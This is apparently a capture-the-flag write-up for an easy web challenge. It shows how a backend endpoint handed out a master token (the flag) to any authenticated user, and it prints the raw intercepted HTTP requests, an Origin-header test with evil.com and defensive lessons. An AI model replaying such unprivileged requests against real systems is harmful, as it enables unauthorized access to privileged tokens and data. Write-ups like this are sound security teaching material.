# Action Packed - 0xV01D CTF 2026

> *An internal dashboard exposes convenience actions for trusted workflows. The interesting part is not the button, but the context around the request.*

**Difficulty:** Easy  
**Category:** Web Exploitation  
**Vulnerability:** Broken Access Control

---

## What Was Vulnerable

The Generate Master Token button had no proper authentication check. It trusted that if a regular user made the request from the right origin, you were allowed to generate a Master Token.

The button appeared non-functional on the frontend but the backend endpoint had no privilege check - it returned the master token to any authenticated session regardless of role. The server handed the Master Token (Flag) directly in the response.

---

## How I Found It

### 1. Reconnaissance

On visiting the webpage it had two sections - Update Details and Generate Master Token.

- Update Details allowed changing your name and department
- Generate Master Token had a button that appeared to do nothing when clicked

Noticing this I intercepted both requests using Burp Suite.

### 2. Intercepting the Requests

**Update Details - Request and Response:**

```
POST / HTTP/1.1
Host: faisalulde-9c872a4e.challs.0xv01d-ctf.xyz
Next-Action: cd2b4b472561774fc0bd652dc4da5719a893167d
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWTmQw24K0LVgkshd
Origin: http://faisalulde-9c872a4e.challs.0xv01d-ctf.xyz


------WebKitFormBoundaryWTmQw24K0LVgkshd
Content-Disposition: form-data; name="1_$ACTION_ID_cd2b4b472561774fc0bd652dc4da5719a893167d"


------WebKitFormBoundaryWTmQw24K0LVgkshd
Content-Disposition: form-data; name="1_name"

test
------WebKitFormBoundaryWTmQw24K0LVgkshd
Content-Disposition: form-data; name="1_department"

test
------WebKitFormBoundaryWTmQw24K0LVgkshd
Content-Disposition: form-data; name="0"

["$K1"]
------WebKitFormBoundaryWTmQw24K0LVgkshd--
```

```json
0:["$@1",["BXWGN_shhgAoAo8Z4rloN",null]]
1:{"success":true,"message":"Profile updated successfully."}
```

The `BXWGN_shhgAoAo8Z4rloN` in the response is likely a system-generated random token used as a temporary identifier - possibly an Action ID, Session ID, or CSRF Token.

**Generate Master Token - Request and Response:**

```
POST / HTTP/1.1
Host: faisalulde-9c872a4e.challs.0xv01d-ctf.xyz
Next-Action: 33924c174e655435ab82a6bdaee5448329835b12
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDlhn0A8I9Ujmd6BI
Origin: http://faisalulde-9c872a4e.challs.0xv01d-ctf.xyz

------WebKitFormBoundaryDlhn0A8I9Ujmd6BI
Content-Disposition: form-data; name="1_$ACTION_ID_33924c174e655435ab82a6bdaee5448329835b12"


------WebKitFormBoundaryDlhn0A8I9Ujmd6BI
Content-Disposition: form-data; name="0"

["$K1"]
------WebKitFormBoundaryDlhn0A8I9Ujmd6BI--
```

```json
0:["$@1",["BXWGN_shhgAoAo8Z4rloN",null]]
1:{"token":"0xV01D{c693172d-af96-4766-9dc8-0f54de51cbf3}"}
```

### 3. Flag Captured

Looking at the Generate Master Token response, the flag was right there in the `token` field.

**Flag:** `0xV01D{c693172d-af96-4766-9dc8-0f54de51cbf3}`

---

## Further Analysis

After capturing the flag, I tested whether the Origin header check was actually enforced by changing it to `http://evil.com`.

The server returned `500 Internal Server Error` - confirming the Origin check IS enforced.

This means the vulnerability was not about Origin spoofing. The server correctly validated where the request came from, but completely failed to verify whether the user had the privilege level required to generate a master token. Any authenticated session could call the endpoint and receive the token regardless of role.

**The security gap:** Frontend hid the button's functionality from regular users. Backend had no equivalent restriction.

---

## Techniques Used

1. Broken Access Control - accessing a privileged API endpoint without authorization verification
2. HTTP request interception and analysis using Burp Suite
3. Response analysis to identify sensitive data exposure

---

## Real World Impact

A fintech company's internal dashboard where a regular employee account can generate API master tokens that give full programmatic access to customer data, simply by sending the correct POST request without any privilege check. An attacker with a low-privilege account could silently generate admin-level tokens and use them to access or exfiltrate sensitive customer information.

---

## Lessons Learned

1. Pay attention to the challenge description - "the interesting part is not the button, but the context around the request" was a direct hint to look beyond the UI and examine the raw HTTP traffic
2. When a button appears to do nothing, it may still be sending a request - always intercept and check the response
3. Examine responses thoroughly - sensitive data can be returned without any visible indication in the browser
4. Never trust frontend restrictions alone - if the backend doesn't enforce the same rules, any user can bypass the UI entirely by sending the raw request.

---

*Written by [Faisal Ulde](https://github.com/faisalulde) | 0xV01D CTF 2026*
